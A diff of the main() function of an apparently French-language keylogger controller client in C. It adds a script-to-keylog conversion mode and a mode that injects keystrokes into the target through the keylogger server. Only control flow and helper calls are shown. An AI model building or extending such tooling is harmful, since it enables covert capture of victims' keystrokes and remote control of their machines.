@@ -88,7 +88,30 @@ int main(int argc, char **argv) {
 		return func_ret;
 	}
 
+	/*
+	*  Si le flag de convertion est active, il faut convertir le fichier en speudokeylog
+	*  en keylog, definie dans le fichier speudokeylog.md
+	*/
+	if ((parser.parser & PARSER_FLAG_CONVERT) == PARSER_FLAG_CONVERT) {
+		if (open_file_convert_speudokeylog() != _SUCCESS_) {
+			printf("%sLors de l'ouverture du fichier a convertion : %s%s%s\n", NOK, YELLOW, parser.convert, DEFAULT_COLOR);
+			return _ERROR_OPEN_CONVERT_FILE_;
+		}
+		printf("%sLors de l'ouverture du fichier a convertir : %s%s%s\n", OK, YELLOW, parser.convert, DEFAULT_COLOR);
+		if (open_files_convert_keylog() != _SUCCESS_) {
+			printf("%sLors de l'ouverture du fichier destination de la convertion : %s%s.keylog%s\n", NOK, YELLOW, parser.convert, DEFAULT_COLOR);
+			closed_files();
+			return _ERROR_OPEN_CONVERT_FILE_;
+		}
+		printf("%sLors de l'ouverture du fichier destination de la convertion : %s%s.keylog%s\n", OK, YELLOW, parser.convert, DEFAULT_COLOR);
+		
+		func_ret = convert_speudokeylog_to_keylog();
+		if (func_ret != _SUCCESS_)
+			printf("%s**ERROR**%s Compilation erreur a la ligne %d\n", RED, DEFAULT_COLOR, func_ret);
 
+		closed_files();
+		return _SUCCESS_;
+	}
 
 	// si les flag de replay, export, convert ne sont pas utilise et que
 	// pas de target ni de port afficher le man
@@ -101,22 +124,25 @@ int main(int argc, char **argv) {
 	/*
 	*  Ouverture des fichiers si les flags sont active. En cas
 	*  d'erreur de l'ouverture, stopper l'execution
+	*
+	*  pas d'ouverture de fichier de sortie si une injection est
+	*  en cours
 	*/
-	func_ret = open_file_output(); // ouverture d'un fichier de sortie
-	if (func_ret != _SUCCESS_) {
-		printf("%sLors de l'ouverture du fichier de sortie ", NOK);
-		if ((parser.parser & PARSER_FLAG_OUTPUT) == PARSER_FLAG_OUTPUT)
-			printf("%s%s%s\n", YELLOW, parser.output, DEFAULT_COLOR);
-		else printf("%s%s%s\n", YELLOW, DEFAULT_FILE, DEFAULT_COLOR);
-		return func_ret;
-	} else {
-		printf("%sOuverture du fichier de log des touches : ", OK);
-		if ((parser.parser & PARSER_FLAG_OUTPUT) == PARSER_FLAG_OUTPUT)
-			printf("%s%s%s\n", YELLOW, parser.output, DEFAULT_COLOR);
-		else printf("%s%s%s\n", YELLOW, DEFAULT_FILE, DEFAULT_COLOR);
+	if ((parser.parser & PARSER_FLAG_INTPUT) != PARSER_FLAG_INTPUT) {
+		func_ret = open_file_output(); // ouverture d'un fichier de sortie
+		if (func_ret != _SUCCESS_) {
+			printf("%sLors de l'ouverture du fichier de sortie ", NOK);
+			if ((parser.parser & PARSER_FLAG_OUTPUT) == PARSER_FLAG_OUTPUT)
+				printf("%s%s%s\n", YELLOW, parser.output, DEFAULT_COLOR);
+			else printf("%s%s%s\n", YELLOW, DEFAULT_FILE, DEFAULT_COLOR);
+			return func_ret;
+		} else {
+			printf("%sOuverture du fichier de log des touches : ", OK);
+			if ((parser.parser & PARSER_FLAG_OUTPUT) == PARSER_FLAG_OUTPUT)
+				printf("%s%s%s\n", YELLOW, parser.output, DEFAULT_COLOR);
+			else printf("%s%s%s\n", YELLOW, DEFAULT_FILE, DEFAULT_COLOR);
+		}
 	}
-
-	// A faire fichier d'input si on garde la possibilite d'envoyer des touches
 
 	/*
 	*  Ouverture de la connection avec le serveur. Stopper l'execution
@@ -137,6 +163,27 @@ int main(int argc, char **argv) {
 	*  pour quitter le programme sans 
 	*/
 	signal(SIGINT, &signal_stoppe_exec);
+
+	/*
+	*  Injection des touches vert la cible en cas de declanchement du
+	*  flag PARSER_FLAG_INTPUT
+	*/
+	if ((parser.parser & PARSER_FLAG_INTPUT) == PARSER_FLAG_INTPUT) {
+		func_ret = open_input_file();
+		if (func_ret != _SUCCESS_) {
+			printf("%sLors de l'ouverture du fichier input : %s%s%s\n", NOK, YELLOW, parser.input, DEFAULT_COLOR);
+			close_files_and_network();
+			return func_ret;
+		}
+		printf("%sLors de l'ouverture du fichier input : %s%s%s\n", OK, YELLOW, parser.input, DEFAULT_COLOR);
+
+		func_ret = send_input_data_at_keylogger();
+		if (func_ret != _SUCCESS_) printf("%sLors de la transmition des touches au serveur keylogger\n", NOK);
+		else printf("%sLors de la transmition des touches au serveur keylogger\n", OK);
+
+		close_files_and_network();
+		return _SUCCESS_;
+	}
 
 	/*
 	*  Boucle d'execution pour recuperer les touches du keylogger et
